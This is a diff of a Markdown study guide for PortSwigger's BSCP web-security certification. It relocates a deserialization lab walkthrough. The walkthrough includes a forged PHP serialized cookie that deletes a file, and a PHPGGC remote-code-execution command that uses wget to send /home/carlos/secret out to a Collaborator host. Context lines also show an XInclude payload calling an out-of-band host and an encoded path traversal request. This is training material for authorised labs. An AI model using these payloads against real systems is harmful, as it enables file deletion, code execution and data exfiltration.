@@ -14,7 +14,6 @@
 **[Privilege Escalation](#privilege-escalation)**  
 [JSON roleid PrivEsc](#privesc-json-roleid)  
 [CSRF Account Takeover](#csrf-account-takeover)  
-[Deserialization](#deserialization)  
 [SQLi Admin Credential Exfil](#sql-injection)  
 [JSON Web Tokens](#jwt)  
   
@@ -26,6 +25,7 @@
 [Cross Site Request Forgery](#csrf)  
 [File path traversal](#file-path-traversal)  
 [File Uploads](#file-uploads)  
+[Deserialization](#deserialization)  
   
 **[Appendix](#appendix)**  
 [Solve Labs with Python](#solve-labs-with-python)  
@@ -951,40 +951,6 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)  
   
-## Deserialization  
-
->Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
-
-![info-disclose](images/info-disclose.png)  
-
->Reviewing PHP source code by adding ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice **desctruct** method.  
-
-![comments-in-source-code](images/comments-in-source-code.png)  
-
->Original Decoded cookie 
-
-```
-O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x";}
-```  
-
->Make new PHP serial CustomTemplate object with the **lock_file_path** attribute set to **/home/carlos/morale.txt**. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the lenth
-
-```
-O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
-```  
-
-![modify-serial-cookie](images/modify-serial-cookie.png)  
-  
-[PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
-
->**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP funcition and extract content out-of-band using PHPGGC.  
-
-```
-./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
-```  
-
-[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
-
 ## SQL Injection  
 
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
@@ -1686,7 +1652,40 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 [PortSwigger Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)  
   
+## Deserialization  
 
+>Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
+
+![info-disclose](images/info-disclose.png)  
+
+>Reviewing PHP source code by adding ***~*** character at end of GET request ```https://target.net/libs/CustomTemplate.php~```, we notice **desctruct** method.  
+
+![comments-in-source-code](images/comments-in-source-code.png)  
+
+>Original Decoded cookie 
+
+```
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"bi0egmdu49lnl9h2gxoj3at4sh3ifh9x";}
+```  
+
+>Make new PHP serial CustomTemplate object with the **lock_file_path** attribute set to **/home/carlos/morale.txt**. Make sure to use the correct data type labels and length indicators. The 's' indicate string and the lenth
+
+```
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```  
+
+![modify-serial-cookie](images/modify-serial-cookie.png)  
+  
+[PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
+
+>**Note:** In BSCP exam not going to run this as it delete file, in exam read source code to ***identify*** the ```unserialize()``` PHP funcition and extract content out-of-band using PHPGGC.  
+
+```
+./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
+```  
+
+[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
+  
 # Appendix  
 
 >This section contain **additional** information to solving the Portswigger labs and approaching the BSCP exam, such as the youtube content creators, Burp speed scanning technique, and python automated scripts I copied from [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
@@ -1716,7 +1715,6 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 ```xml
 <hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://vfe7mddka77io3rz2xjvvbum5db9zzn0br1er2g.oastify.com/foo"/></hqt>
 ```  
-
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
   
